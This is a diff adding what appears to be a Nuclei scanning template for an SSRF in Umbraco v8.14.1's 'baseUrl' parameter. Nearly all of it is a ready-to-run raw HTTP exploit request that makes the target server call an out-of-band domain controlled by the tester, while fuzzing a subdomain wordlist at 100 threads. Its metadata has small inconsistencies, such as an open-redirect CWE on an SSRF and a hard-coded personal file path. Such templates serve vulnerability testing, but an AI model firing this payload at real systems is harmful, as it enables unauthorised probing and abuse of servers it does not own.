@@ -1,0 +1,29 @@
+id: umbraco-base-ssrf-2
+info:
+  author: dhiyaneshDk
+  classification:
+    cve-id: CVE-2020-10770
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-601
+  name: Umbraco v8.14.1 - 'baseUrl' SSRF
+  reference: https://www.exploit-db.com/exploits/50462
+  severity: medium
+  tags: ssrf,umbraco,oast
+requests:
+- attack: sniper
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{Host}}.{{Port}}.{{Subdomains}}.umbraco.{{MY-DOMAIN}}
+    HTTP/1.1
+
+    Host: {{Subdomains}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/81.0.4044.138 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate'
+  threads: 100
